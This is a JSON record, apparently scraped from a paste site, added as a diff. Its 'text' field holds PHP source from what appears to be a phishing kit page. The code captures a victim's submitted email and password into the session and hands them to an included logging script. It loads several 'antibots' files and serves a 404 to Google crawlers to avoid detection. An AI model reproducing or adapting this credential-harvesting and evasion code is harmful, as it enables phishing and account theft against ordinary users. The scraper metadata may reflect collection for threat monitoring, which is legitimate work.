@@ -1,0 +1,14 @@
+{
+ "espireDate": "N",
+ "format": "text",
+ "jSonReasons": [
+  "lg_en",
+  "kw_bots"
+ ],
+ "key": "nYLvFCts",
+ "pasteDate": "Feb 27, 2018, 11:39:48 PM",
+ "relevancy": 1.0,
+ "relevant": false,
+ "text": "<?php\nsession_start();\nerror_reporting(0);\n##################### SECOND FILES #####################\ninclude('../../ReDa/get_lang_en.php'); \n################## ACCOUNT INFORMATION #################\n$_SESSION['_login_email_']    = $_POST['login_email'];\n$_SESSION['_login_password_'] = $_POST['login_password'];\n################## ACCOUNT INFORMATION #################\nif(filter_var($_POST['login_email'], FILTER_VALIDATE_EMAIL)){  \n    include('LOG.php');\n}\n$charSet = \"XXXXID0123456789\";\n$charSetSize = strlen($charSet); $pwdSize = 6;\nfor ($i = 0; $i < $pwdSize; $i++) {\n  $XXX_03 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];\n  $XXX_04 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];\n  $XXX_05 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];\n  $XXX_06 .= $charSet[ rand( 5, strlen($charSetSize) - 1 ) ];\n}\n\n $Z118xF0rm3XX = $XXX_03.mt_rand();\n $x87Z_E54IlsXX = $XXX_04.mt_rand();\n $Zx987P4ss0WrD = $XXX_05.mt_rand();\n $GrimmDZEBI987 = $XXX_06.mt_rand();\n//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//\ninclude \"../../../BOTS/antibots1.php\";\ninclude \"../../../BOTS/antibots2.php\";\ninclude \"../../../BOTS/antibots3.php\";\ninclude \"../../../BOTS/antibots4.php\";\ninclude \"../../../BOTS/antibots5.php\";\ninclude \"../../../BOTS/antibots6.php\";\n//----------------------------------------------------------------------------------------------------------------//\nif(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }\nif(strpos(gethostbyaddr(getenv(\"REMOTE_ADDR\")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }\n//----------------------------------------------------------------------------------------------------------------//\n?>",
+ "title": ""
+}
